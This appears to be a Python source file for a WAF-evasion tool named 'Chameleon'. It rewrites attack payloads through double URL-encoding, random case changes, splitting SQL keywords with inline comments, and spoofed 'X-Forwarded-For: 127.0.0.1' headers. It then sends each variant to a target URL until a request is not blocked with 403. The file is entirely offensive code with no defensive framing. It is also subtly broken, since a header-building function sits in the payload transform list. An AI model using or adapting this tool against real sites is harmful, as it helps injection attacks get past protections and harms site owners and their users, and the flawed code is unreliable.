import random
import urllib.parse

class Chameleon:
    def __init__(self, session):
        self.session = session
        self.evasion_methods = [
            self._method_obfuscation,
            self._url_encoding,
            self._case_alteration,
            self._sql_injection_evasion,
            self._custom_headers,
        ]

    def _method_obfuscation(self, payload):
        if "'" in payload:
            return payload.replace("'", "%2527")
        return payload

    def _url_encoding(self, payload):
        return urllib.parse.quote(payload)

    def _case_alteration(self, payload):
        return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)

    def _sql_injection_evasion(self, payload):
        return payload.replace("SELECT", "SEL/**/ECT")

    def _custom_headers(self, url):
        return {
            'Referer': url,
            'X-Forwarded-For': '127.0.0.1'
        }

    async def evade_waf(self, url, original_payload):
        for method in self.evasion_methods:
            evaded_payload = method(original_payload)
            response = await self._test_payload(url, evaded_payload)
            if response and response.status != 403:
                return evaded_payload, response
        return original_payload, None

    async def _test_payload(self, url, payload):
        try:
            headers = self._custom_headers(url)
            async with self.session.get(url, headers=headers, params={'q': payload}, timeout=5) as response:
                return response
        except Exception:
            return None
